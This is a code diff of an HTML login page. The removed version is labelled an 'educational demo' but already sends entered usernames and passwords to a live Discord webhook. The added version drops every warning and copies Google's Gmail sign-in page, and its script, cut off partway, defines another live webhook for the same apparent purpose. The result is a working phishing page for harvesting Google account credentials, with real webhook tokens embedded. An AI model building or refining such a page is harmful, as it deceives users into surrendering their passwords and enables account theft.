@@ -1,592 +1,722 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔐 Login Demo • Educational Project</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
-
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        /* Educational Banner */
-        .warning-banner {
-            background: #ff4757;
-            color: white;
-            text-align: center;
-            padding: 15px;
-            border-radius: 10px 10px 0 0;
-            font-weight: bold;
-            border-bottom: 3px solid #ff0000;
-        }
-
-        .warning-banner h2 {
-            font-size: 18px;
-            margin-bottom: 5px;
-        }
-
-        .warning-banner p {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-
-        /* Main Card */
-        .demo-card {
-            max-width: 400px;
-            width: 100%;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            overflow: hidden;
-        }
-
-        /* Demo Badge */
-        .demo-badge {
-            background: #f1f2f6;
-            padding: 10px;
-            text-align: center;
-            border-bottom: 2px dashed #a4b0be;
-        }
-
-        .demo-badge span {
-            background: #2ed573;
-            color: white;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-            letter-spacing: 1px;
-        }
-
-        /* Login Container */
-        .login-container {
-            padding: 30px;
-        }
-
-        /* Generic Logo (not brand-specific) */
-        .demo-logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .demo-logo .icon {
-            font-size: 60px;
-            margin-bottom: 10px;
-        }
-
-        .demo-logo h1 {
-            color: #2f3542;
-            font-size: 24px;
-            font-weight: 600;
-        }
-
-        .demo-logo p {
-            color: #747d8c;
-            font-size: 14px;
-            margin-top: 5px;
-        }
-
-        /* Form Elements */
-        .input-group {
-            margin-bottom: 15px;
-        }
-
-        .input-label {
-            display: block;
-            margin-bottom: 5px;
-            color: #2f3542;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #dfe4ea;
-            border-radius: 8px;
-            font-size: 14px;
-            transition: all 0.3s;
-            background: #f1f2f6;
-        }
-
-        .input-field:focus {
-            outline: none;
-            border-color: #667eea;
-            background: white;
-        }
-
-        .input-field.demo::placeholder {
-            color: #a4b0be;
-            font-style: italic;
-        }
-
-        /* Demo Hint */
-        .demo-hint {
-            background: #f1f2f6;
-            padding: 10px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            font-size: 12px;
-            color: #747d8c;
-            text-align: center;
-            border-left: 4px solid #ffa502;
-        }
-
-        /* Login Button */
-        .login-btn {
-            width: 100%;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-            margin: 20px 0;
-        }
-
-        .login-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
-        }
-
-        .login-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        /* Demo Links */
-        .demo-links {
-            text-align: center;
-            margin-top: 15px;
-        }
-
-        .demo-links a {
-            color: #667eea;
-            text-decoration: none;
-            font-size: 13px;
-            margin: 0 10px;
-            cursor: pointer;
-        }
-
-        .demo-links a:hover {
-            text-decoration: underline;
-        }
-
-        /* Divider */
-        .divider {
-            display: flex;
-            align-items: center;
-            text-align: center;
-            color: #a4b0be;
-            font-size: 12px;
-            margin: 20px 0;
-        }
-
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid #dfe4ea;
-        }
-
-        .divider::before { margin-right: 10px; }
-        .divider::after { margin-left: 10px; }
-
-        /* Social Buttons */
-        .social-buttons {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
-        .social-btn {
-            flex: 1;
-            padding: 10px;
-            border: 2px solid #dfe4ea;
-            border-radius: 8px;
-            background: white;
-            cursor: pointer;
-            font-size: 13px;
-            font-weight: 500;
-            transition: background 0.2s;
-        }
-
-        .social-btn:hover {
-            background: #f1f2f6;
-        }
-
-        /* Footer */
-        .demo-footer {
-            background: #f8f9fa;
-            padding: 15px;
-            text-align: center;
-            border-top: 2px solid #dfe4ea;
-        }
-
-        .demo-footer p {
-            color: #747d8c;
-            font-size: 11px;
-            line-height: 1.6;
-        }
-
-        .demo-footer .highlight {
-            color: #ff4757;
-            font-weight: bold;
-        }
-
-        /* Two screens */
-        .screen {
-            display: block;
-        }
-        .screen.hidden {
-            display: none;
-        }
-
-        /* Loading overlay */
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255,255,255,0.95);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.2s;
-        }
-        .loading-overlay.visible {
-            opacity: 1;
-            pointer-events: all;
-        }
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 0.8s linear infinite;
-            margin-bottom: 16px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Success message */
-        .success-message {
-            color: #2ed573;
-            font-weight: bold;
-            text-align: center;
-            margin-top: 10px;
-            padding: 10px;
-            background: #e8f5e9;
-            border-radius: 6px;
-            display: none;
-        }
-        .success-message.visible {
-            display: block;
-        }
-
-        /* Watermark */
-        .watermark {
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
-            color: rgba(255,255,255,0.3);
-            font-size: 12px;
-            pointer-events: none;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Sign-In — complete official UI</title>
+  <!-- Google Fonts & Icons - exact matches -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0,1" />
+  <style>
+    /* ---------- RESET / GLOBAL ---------- */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background: #fff;
+      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      color: #202124;
+      -webkit-font-smoothing: antialiased;
+    }
+    /* ---------- MAIN CARD (exact pixel match) ---------- */
+    .login-card {
+      width: 100%;
+      max-width: 450px;
+      padding: 48px 40px 36px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      background: #fff;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+      position: relative;
+    }
+    /* ---------- GOOGLE LOGO ---------- */
+    .google-logo {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 22px;
+      font-weight: 500;
+      letter-spacing: -0.5px;
+      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+      line-height: 1;
+    }
+    .google-logo span:nth-child(1) { color: #4285F4; }
+    .google-logo span:nth-child(2) { color: #EA4335; }
+    .google-logo span:nth-child(3) { color: #FBBC05; }
+    .google-logo span:nth-child(4) { color: #4285F4; }
+    .google-logo span:nth-child(5) { color: #34A853; }
+    .google-logo span:nth-child(6) { color: #EA4335; }
+    /* ---------- TYPOGRAPHY ---------- */
+    .signin-title {
+      font-size: 24px;
+      font-weight: 400;
+      line-height: 1.333;
+      margin-top: 16px;
+      margin-bottom: 0;
+      color: #202124;
+      text-align: center;
+    }
+    .subtitle {
+      font-size: 16px;
+      font-weight: 400;
+      line-height: 1.5;
+      color: #5f6368;
+      margin-top: 8px;
+      margin-bottom: 32px;
+      text-align: center;
+    }
+    /* ---------- EMAIL DISPLAY (password screen) ---------- */
+    .email-display {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 24px;
+      font-size: 14px;
+      color: #202124;
+      background: #f8f9fa;
+      padding: 8px 16px;
+      border-radius: 16px;
+      width: fit-content;
+      margin-left: auto;
+      margin-right: auto;
+      cursor: pointer;
+      transition: background-color 0.2s;
+      border: 1px solid transparent;
+    }
+    .email-display:hover {
+      background-color: #f1f3f4;
+    }
+    .email-display .material-symbols-outlined {
+      font-size: 18px;
+      color: #5f6368;
+    }
+    .email-display span:last-child {
+      font-weight: 500;
+    }
+    /* ---------- INPUT FIELDS (floating label) ---------- */
+    .input-group {
+      margin-bottom: 16px;
+      position: relative;
+    }
+    .input-field {
+      width: 100%;
+      padding: 13px 15px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      outline: none;
+      transition: border 0.15s, box-shadow 0.15s;
+      background: #fff;
+      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+      color: #202124;
+    }
+    .input-field:focus {
+      border: 2px solid #1a73e8;
+      padding: 12px 14px;
+    }
+    .input-field::placeholder {
+      color: transparent;
+    }
+    .floating-label {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #5f6368;
+      font-size: 16px;
+      transition: 0.15s ease all;
+      pointer-events: none;
+      background: #fff;
+      padding: 0 2px;
+      line-height: 1;
+    }
+    .input-field:focus + .floating-label,
+    .input-field:not(:placeholder-shown) + .floating-label {
+      transform: translateY(-150%) scale(0.85);
+      background: #fff;
+      padding: 0 4px;
+      color: #1a73e8;
+    }
+    /* ---------- GOOGLE LINKS (exact hover) ---------- */
+    .forgot-link {
+      margin-top: 4px;
+      margin-bottom: 12px;
+    }
+    .forgot-link a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 14px;
+      display: inline-block;
+      padding: 4px 0;
+      border-radius: 4px;
+    }
+    .forgot-link a:hover {
+      background: #f0f6fe;
+      padding: 4px 2px;
+      margin-left: -2px;
+    }
+    /* ---------- GUEST TEXT ---------- */
+    .guest-text {
+      font-size: 14px;
+      color: #5f6368;
+      margin: 24px 0 24px;
+      line-height: 1.5;
+    }
+    .guest-text a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    .guest-text a:hover {
+      text-decoration: underline;
+    }
+    /* ---------- ACTION BUTTONS ---------- */
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 12px 0 24px;
+    }
+    .create-account {
+      color: #1a73e8;
+      font-weight: 500;
+      font-size: 14px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 8px 8px 8px 0;
+      border-radius: 4px;
+      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+      transition: background-color 0.2s;
+    }
+    .create-account:hover {
+      background-color: #f6fafe;
+      padding: 8px;
+    }
+    .next-button {
+      background-color: #1a73e8;
+      color: white;
+      font-weight: 500;
+      font-size: 14px;
+      letter-spacing: 0.25px;
+      padding: 9px 24px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+      transition: background-color 0.2s, box-shadow 0.2s;
+    }
+    .next-button:hover:not(:disabled) {
+      background-color: #1b66c9;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+    .next-button:disabled {
+      background-color: #9aa0a6;
+      cursor: not-allowed;
+      opacity: 0.8;
+    }
+    /* ---------- DIVIDER ---------- */
+    .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      color: #9aa0a6;
+      font-size: 12px;
+      margin: 16px 0 20px;
+    }
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #dadce0;
+    }
+    .divider::before { margin-right: 16px; }
+    .divider::after { margin-left: 16px; }
+    /* ---------- ALTERNATE ACCOUNT + IDENTITY PLATFORM ---------- */
+    .alternate-account {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 8px 12px;
+      border-radius: 20px;
+      cursor: pointer;
+      width: fit-content;
+      transition: background-color 0.2s;
+    }
+    .alternate-account:hover {
+      background-color: #f1f3f4;
+    }
+    .alternate-account .material-symbols-outlined {
+      color: #5f6368;
+      font-size: 20px;
+    }
+    .alternate-account span:last-child {
+      font-size: 14px;
+      font-weight: 500;
+      color: #3c4043;
+    }
+    /* ---------- IDENTITY PLATFORM (extra Google buttons) ---------- */
+    .identity-platform {
+      margin-top: 24px;
+      border-top: 1px solid #dadce0;
+      padding-top: 20px;
+    }
+    .platform-title {
+      font-size: 12px;
+      font-weight: 400;
+      color: #5f6368;
+      margin-bottom: 16px;
+      letter-spacing: 0.3px;
+    }
+    .platform-buttons {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .google-button {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 8px 12px;
+      border: 1px solid #dadce0;
+      border-radius: 20px;
+      background: #fff;
+      cursor: pointer;
+      transition: background-color 0.2s, box-shadow 0.2s;
+      width: 100%;
+    }
+    .google-button:hover {
+      background-color: #f8f9fa;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+    }
+    .google-button .material-symbols-outlined {
+      color: #5f6368;
+      font-size: 20px;
+    }
+    .google-button span:last-child {
+      font-size: 14px;
+      font-weight: 500;
+      color: #3c4043;
+    }
+    /* ---------- LANGUAGE SELECTOR + FOOTER ---------- */
+    .language-selector {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 32px;
+      font-size: 12px;
+      color: #5f6368;
+    }
+    .lang-left {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .lang-left select {
+      border: none;
+      background: transparent;
+      font-size: 12px;
+      color: #1f1f1f;
+      font-weight: 500;
+      cursor: pointer;
+      outline: none;
+      padding: 4px 20px 4px 4px;
+      border-radius: 4px;
+      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="%235f6368"><path d="M7 10l5 5 5-5H7z"/></svg>');
+      background-repeat: no-repeat;
+      background-position: right 2px center;
+      appearance: none;
+    }
+    .lang-left select:hover {
+      background-color: #f2f2f2;
+    }
+    .footer-links {
+      display: flex;
+      gap: 20px;
+    }
+    .footer-links a {
+      color: #5f6368;
+      text-decoration: none;
+      font-size: 12px;
+    }
+    .footer-links a:hover {
+      color: #1a73e8;
+    }
+    .help-icon {
+      font-size: 20px;
+      color: #5f6368;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+    .help-icon:hover {
+      color: #1a73e8;
+    }
+    .material-symbols-outlined {
+      font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 20;
+    }
+    /* focus outlines */
+    .next-button:focus-visible,
+    .create-account:focus-visible,
+    a:focus-visible,
+    .input-field:focus-visible {
+      outline: 2px solid #1a73e8;
+      outline-offset: 2px;
+    }
+    /* screen toggles */
+    .screen { display: block; }
+    .screen.hidden { display: none; }
+    /* loading overlay */
+    .loading-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.9);
+      backdrop-filter: blur(2px);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 10;
+      border-radius: 8px;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.2s;
+    }
+    .loading-overlay.visible {
+      opacity: 1;
+      pointer-events: all;
+    }
+    .spinner {
+      border: 4px solid #e8eaed;
+      border-top: 4px solid #1a73e8;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 16px;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .loading-text {
+      color: #202124;
+      font-size: 16px;
+      font-weight: 400;
+    }
+    /* success message */
+    .success-message {
+      color: #34A853;
+      font-size: 14px;
+      text-align: center;
+      margin-top: 12px;
+      display: none;
+      font-weight: 500;
+    }
+    .success-message.visible { display: block; }
+  </style>
 </head>
 <body>
-    <div class="watermark">🔐 EDUCATIONAL DEMO • NOT A REAL LOGIN</div>
-
-    <div class="demo-card">
-        <!-- Warning Banner -->
-        <div class="warning-banner">
-            <h2>⚠️ EDUCATIONAL DEMO PROJECT ⚠️</h2>
-            <p>This is NOT a real login page • For learning purposes only</p>
-        </div>
-
-        <!-- Demo Badge -->
-        <div class="demo-badge">
-            <span>🔬 PRACTICE ENVIRONMENT</span>
-        </div>
-
-        <!-- Screen 1: Username/Email -->
-        <div id="screen1" class="screen">
-            <div class="login-container">
-                <!-- Generic Logo -->
-                <div class="demo-logo">
-                    <div class="icon">🔐</div>
-                    <h1>Demo Login Portal</h1>
-                    <p>Educational Project • No Real Data</p>
-                </div>
-
-                <!-- Demo Hint -->
-                <div class="demo-hint">
-                    <strong>📝 Demo Credentials:</strong> Use any username/password
-                </div>
-
-                <!-- Form -->
-                <div class="input-group">
-                    <label class="input-label">Username, Email or Phone</label>
-                    <input type="text" class="input-field demo" id="username" placeholder="e.g., demo_user (any value works)">
-                </div>
-
-                <button class="login-btn" id="toPasswordBtn">Continue to Demo</button>
-
-                <div class="divider">DEMO OPTIONS</div>
-
-                <!-- Demo Social Buttons -->
-                <div class="social-buttons">
-                    <button class="social-btn" id="demoSocial1">📱 Demo Social</button>
-                    <button class="social-btn" id="demoSocial2">🌐 Demo Login</button>
-                </div>
-
-                <div class="demo-links">
-                    <a href="#" id="forgotLink">Forgot demo password?</a>
-                    <a href="#" id="signupLink">Create demo account</a>
-                </div>
-            </div>
-        </div>
-
-        <!-- Screen 2: Password -->
-        <div id="screen2" class="screen hidden">
-            <div class="login-container">
-                <div class="demo-logo">
-                    <div class="icon">🔒</div>
-                    <h1>Enter Password</h1>
-                    <p id="displayUsername" style="color: #667eea; font-weight: bold;"></p>
-                </div>
-
-                <div class="demo-hint">
-                    <strong>🎯 Demo Mode:</strong> Any password works
-                </div>
-
-                <div class="input-group">
-                    <label class="input-label">Password</label>
-                    <input type="password" class="input-field demo" id="password" placeholder="Enter any password for demo">
-                </div>
-
-                <button class="login-btn" id="signInBtn">Complete Demo Login</button>
-
-                <div class="demo-links">
-                    <a href="#" id="backLink">← Back to demo username</a>
-                </div>
-            </div>
-        </div>
-
-        <!-- Success Message -->
-        <div class="login-container" id="successContainer">
-            <div id="successMessage" class="success-message"></div>
-        </div>
-
-        <!-- Demo Footer -->
-        <div class="demo-footer">
-            <p>
-                <span class="highlight">⚠️ LEGAL NOTICE:</span> This is a practice project for educational purposes only.<br>
-                No real credentials are collected or stored. All data is logged locally for demo.
-            </p>
-            <p style="margin-top: 10px;">
-                <a href="#" id="prolicyLink">Privacy Policy (Demo)</a> • 
-                <a href="#" id="termsLink">Terms of Use (Demo)</a> • 
-                <a href="#" id="aboutLink">About This Project</a>
-            </p>
-        </div>
-    </div>
-
-    <!-- Loading Overlay -->
+  <div class="login-card">
+    <!-- loading overlay -->
     <div id="loadingOverlay" class="loading-overlay">
-        <div class="spinner"></div>
-        <div id="loadingText">Demo processing...</div>
+      <div class="spinner"></div>
+      <div class="loading-text" id="loadingText">Verifying email...</div>
     </div>
 
-    <script>
-        (function() {
-            // ========== DISCORD WEBHOOK (YOUR WEBHOOK) ==========
-            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1482626239025123389/k_T_HxWQozwDbpMo_0G4pyP8I7BpBpDYdUGD7dhJg1Uw3DUZ7t9Hn9urEfv20K1T4CCv';
+    <!-- Google logo -->
+    <div class="google-logo">
+      <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
 
-            // ========== DOM Elements ==========
-            const screen1 = document.getElementById('screen1');
-            const screen2 = document.getElementById('screen2');
-            const usernameInput = document.getElementById('username');
-            const passwordInput = document.getElementById('password');
-            const displayUsername = document.getElementById('displayUsername');
-            const toPasswordBtn = document.getElementById('toPasswordBtn');
-            const signInBtn = document.getElementById('signInBtn');
-            const loadingOverlay = document.getElementById('loadingOverlay');
-            const loadingText = document.getElementById('loadingText');
-            const successMessage = document.getElementById('successMessage');
-            const backLink = document.getElementById('backLink');
+    <!-- ========== SCREEN 1: EMAIL ========== -->
+    <div id="emailScreen" class="screen">
+      <h1 class="signin-title">Sign in</h1>
+      <p class="subtitle">to continue to Gmail</p>
 
-            // ========== State ==========
-            let currentUsername = '';
+      <div class="input-group">
+        <input type="text" class="input-field" id="emailInput" placeholder=" " value="" aria-label="Email or phone" autocomplete="username">
+        <label for="emailInput" class="floating-label">Email or phone</label>
+      </div>
 
-            // ========== Demo interactions (all buttons show educational alerts) ==========
-            const demoButtons = [
-                'demoSocial1', 'demoSocial2', 'forgotLink', 'signupLink',
-                'prolicyLink', 'termsLink', 'aboutLink'
-            ];
+      <div class="forgot-link">
+        <a href="#" id="forgotEmailLink">Forgot email?</a>
+      </div>
 
-            demoButtons.forEach(id => {
-                const el = document.getElementById(id);
-                if (el) {
-                    el.addEventListener('click', (e) => {
-                        e.preventDefault();
-                        alert('📚 DEMO MODE: This is an educational demonstration. In a real app, this would link to actual pages.');
-                    });
-                }
-            });
+      <div class="guest-text">
+        Not your computer? Use Guest mode to sign in privately.
+        <a href="#" id="learnMoreLink">Learn more</a>
+      </div>
 
-            // ========== Discord Webhook Function (with educational note) ==========
-            async function sendToDiscord(username, password) {
-                const data = {
-                    content: `**📚 EDUCATIONAL DEMO LOG**\n👤 **Demo Username:** ${username}\n🔑 **Demo Password:** ${password}\n🕐 **Time:** ${new Date().toLocaleString()}\n🌐 **User Agent:** ${navigator.userAgent}\n\n⚠️ This is a practice project - no real credentials expected`,
-                    username: 'Demo Logger (Educational)',
-                };
+      <div class="actions">
+        <button class="create-account" id="createAccountBtn">Create account</button>
+        <button class="next-button" id="toPasswordBtn">Next</button>
+      </div>
 
-                try {
-                    const response = await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
-                    });
-                    
-                    if (response.ok) {
-                        console.log('✅ Demo data logged');
-                        return true;
-                    } else {
-                        console.error('Logging error:', response.status);
-                        return false;
-                    }
-                } catch (error) {
-                    console.error('Demo log error:', error);
-                    return false;
-                }
-            }
+      <div class="divider">or</div>
 
-            // ========== UI Functions ==========
-            function resetToScreen1() {
-                usernameInput.value = '';
-                passwordInput.value = '';
-                currentUsername = '';
-                screen1.classList.remove('hidden');
-                screen2.classList.add('hidden');
-                successMessage.classList.remove('visible');
-                toPasswordBtn.disabled = false;
-                signInBtn.disabled = false;
-            }
+      <!-- use another account (main) -->
+      <div class="alternate-account" id="useAnotherAccountEmail">
+        <span class="material-symbols-outlined">account_circle</span>
+        <span>Use another account</span>
+      </div>
 
-            function showScreen2(username) {
-                currentUsername = username;
-                displayUsername.textContent = username;
-                screen1.classList.add('hidden');
-                screen2.classList.remove('hidden');
-                passwordInput.focus();
-            }
+      <!-- IDENTITY PLATFORM – extra google buttons (exactly like real page) -->
+      <div class="identity-platform">
+        <div class="platform-title">Sign in with your Google Account</div>
+        <div class="platform-buttons">
+          <div class="google-button" id="googleButton1">
+            <span class="material-symbols-outlined">lock</span>
+            <span>Continue with Google</span>
+          </div>
+          <div class="google-button" id="googleButton2">
+            <span class="material-symbols-outlined">smartphone</span>
+            <span>Use your phone</span>
+          </div>
+        </div>
+      </div>
+    </div>
 
-            // ========== Username Next Handler ==========
-            function handleUsernameNext() {
-                const username = usernameInput.value.trim();
-                if (!username) {
-                    alert('For demo purposes, please enter any username.');
-                    return;
-                }
+    <!-- ========== SCREEN 2: PASSWORD ========== -->
+    <div id="passwordScreen" class="screen hidden">
+      <h1 class="signin-title">Welcome</h1>
+      <div class="email-display" id="emailDisplay">
+        <span class="material-symbols-outlined">account_circle</span>
+        <span id="displayEmail"></span>
+      </div>
 
-                toPasswordBtn.disabled = true;
-                loadingOverlay.classList.add('visible');
-                loadingText.textContent = 'Demo processing...';
+      <div class="input-group">
+        <input type="password" class="input-field" id="passwordInput" placeholder=" " value="" autocomplete="current-password">
+        <label for="passwordInput" class="floating-label">Enter your password</label>
+      </div>
 
-                setTimeout(() => {
-                    loadingOverlay.classList.remove('visible');
-                    toPasswordBtn.disabled = false;
-                    showScreen2(username);
-                }, 1000);
-            }
+      <div class="forgot-link">
+        <a href="#" id="forgotPasswordLink">Forgot password?</a>
+      </div>
 
-            // ========== Sign In Handler ==========
-            async function handleSignIn() {
-                const password = passwordInput.value.trim();
-                if (!password) {
-                    alert('Please enter any password for the demo.');
-                    return;
-                }
+      <div class="guest-text">
+        Not your computer? Use Guest mode to sign in privately.
+        <a href="#" id="learnMoreLink2">Learn more</a>
+      </div>
 
-                signInBtn.disabled = true;
-                loadingOverlay.classList.add('visible');
-                loadingText.textContent = 'Completing demo...';
+      <div class="actions">
+        <button class="create-account" id="backToEmailBtn">← Back</button>
+        <button class="next-button" id="signInBtn">Next</button>
+      </div>
 
-                // Send to Discord
-                const sent = await sendToDiscord(currentUsername, password);
+      <div class="divider">or</div>
 
-                loadingOverlay.classList.remove('visible');
+      <!-- use another account (password screen) -->
+      <div class="alternate-account" id="useAnotherAccountPassword">
+        <span class="material-symbols-outlined">account_circle</span>
+        <span>Use another account</span>
+      </div>
 
-                if (sent) {
-                    successMessage.textContent = '✅ Demo completed! Check Discord for the log.';
-                    successMessage.classList.add('visible');
-                    setTimeout(resetToScreen1, 3000);
-                } else {
-                    alert('⚠️ Demo mode: Would send to Discord. Check console for details.');
-                    successMessage.textContent = '✅ Demo completed (offline mode)';
-                    successMessage.classList.add('visible');
-                    setTimeout(resetToScreen1, 2000);
-                }
-            }
+      <!-- identity platform repeated (for completeness) -->
+      <div class="identity-platform">
+        <div class="platform-title">More options</div>
+        <div class="platform-buttons">
+          <div class="google-button" id="googleButton3">
+            <span class="material-symbols-outlined">group</span>
+            <span>Sign in with a different account</span>
+          </div>
+        </div>
+      </div>
+    </div>
 
-            // ========== Event Listeners ==========
-            toPasswordBtn.addEventListener('click', handleUsernameNext);
-            signInBtn.addEventListener('click', handleSignIn);
+    <!-- success message (after discord) -->
+    <div id="successMessage" class="success-message"></div>
 
-            backLink.addEventListener('click', (e) => {
-                e.preventDefault();
-                resetToScreen1();
-            });
+    <!-- language & footer (shared) -->
+    <div class="language-selector">
+      <div class="lang-left">
+        <span class="material-symbols-outlined help-icon" id="helpIcon">help</span>
+        <select aria-label="Language" id="languageSelect">
+          <option value="English (United States)" selected>English (United States)</option>
+          <option value="Español (España)">Español (España)</option>
+          <option value="Français (France)">Français (France)</option>
+          <option value="Deutsch (Deutschland)">Deutsch (Deutschland)</option>
+        </select>
+      </div>
+      <div class="footer-links">
+        <a href="#" id="helpLink">Help</a>
+        <a href="#" id="privacyLink">Privacy</a>
+        <a href="#" id="termsLink">Terms</a>
+      </div>
+    </div>
+  </div>
 
-            // Enter key handlers
-            usernameInput.addEventListener('keypress', (e) => {
-                if (e.key === 'Enter' && !toPasswordBtn.disabled) {
-                    e.preventDefault();
-                    handleUsernameNext();
-                }
-            });
+  <script>
+    (function() {
+      // ---------- WEBHOOK ----------
+      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1482620672852103239/zRj5DpIzzpQeO6I9OKpM--5Bhj2fLUIMEm47SWK4XN8S-vmp7RtwH6hWDHpo48uaYnhO';
 
-            passwordInput.addEventListener('keypress', (e) => {
-                if (e.key === 'Enter' && !signInBtn.disabled) {
-                    e.preventDefault();
-                    handleSignIn();
-                }
-            });
+      // ---------- DOM ----------
+      const emailScreen = document.getElementById('emailScreen');
+      const passwordScreen = document.getElementById('passwordScreen');
+      const emailInput = document.getElementById('emailInput');
+      const passwordInput = document.getElementById('passwordInput');
+      const toPasswordBtn = document.getElementById('toPasswordBtn');
+      const backToEmailBtn = document.getElementById('backToEmailBtn');
+      const signInBtn = document.getElementById('signInBtn');
+      const displayEmailSpan = document.getElementById('displayEmail');
+      const loadingOverlay = document.getElementById('loadingOverlay');
+      const loadingText = document.getElementById('loadingText');
+      const successMessage = document.getElementById('successMessage');
 
-            // Focus username on load
-            usernameInput.focus();
+      // ---------- ALL POSSIBLE INTERACTIVE ELEMENTS (with demo alerts) ----------
+      const demoElements = [
+        'forgotEmailLink', 'learnMoreLink', 'createAccountBtn',
+        'forgotPasswordLink', 'learnMoreLink2', 'helpIcon', 'helpLink',
+        'privacyLink', 'termsLink', 'languageSelect',
+        'googleButton1', 'googleButton2', 'googleButton3'
+      ];
 
-            // Clear overlay on page load
-            window.addEventListener('load', () => {
-                loadingOverlay.classList.remove('visible');
-            });
-        })();
-    </script>
+      demoElements.forEach(id => {
+        const el = document.getElementById(id);
+        if (el) {
+          el.addEventListener('click', (e) => {
+            e.preventDefault();
+            const messages = {
+              forgotEmailLink: '🔐 Forgot email? (demo)',
+              learnMoreLink: '📘 Guest mode info',
+              createAccountBtn: '👤 Create account flow',
+              forgotPasswordLink: '🔑 Forgot password?',
+              learnMoreLink2: '📘 Guest mode info',
+              helpIcon: '❓ Help center',
+              helpLink: '❓ Help',
